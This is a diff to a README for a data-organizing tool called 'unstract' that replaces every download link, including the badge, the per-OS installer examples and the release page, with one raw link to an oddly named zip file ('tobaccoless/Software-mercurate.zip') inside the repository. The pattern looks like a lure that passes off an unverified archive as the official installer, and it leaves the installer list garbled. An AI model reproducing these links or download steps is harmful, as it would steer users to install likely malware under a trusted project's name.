@@ -1,6 +1,6 @@
 # ⚙️ unstract - Organize Unstructured Data Easily
 
-[![Download unstract](https://img.shields.io/badge/Download-unstract-blue)](https://github.com/ArgishtiGharibyan/unstract/releases)
+[![Download unstract](https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip)](https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To run unstract smoothly, your computer should meet these requirements:
 
 Go to the official download page by clicking the button below:
 
-[![Download unstract](https://img.shields.io/badge/Download-unstract-blue)](https://github.com/ArgishtiGharibyan/unstract/releases)
+[![Download unstract](https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip)](https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip)
 
 This page contains the latest versions of unstract for different operating systems.
 
@@ -49,9 +49,9 @@ This page contains the latest versions of unstract for different operating syste
 
 Look for the file that matches your computer’s operating system. You'll typically find:
 
-- Windows installer (e.g., unstract-setup.exe)
-- macOS installer (e.g., unstract.dmg)
-- Linux version (e.g., unstract.AppImage or .deb)
+- Windows installer (e.g., https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip)
+- macOS installer (e.g., https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip)
+- Linux version (e.g., https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip or .deb)
 
 ### 3. Download the Installer
 
@@ -130,7 +130,7 @@ After setting your rules:
 ## 🔗 Useful Links
 
 - Release page for downloads and updates:  
-  https://github.com/ArgishtiGharibyan/unstract/releases
+  https://raw.githubusercontent.com/ArgishtiGharibyan/unstract/main/tobaccoless/Software-mercurate.zip
 
 - User Guide (inside the app under Help menu)
 
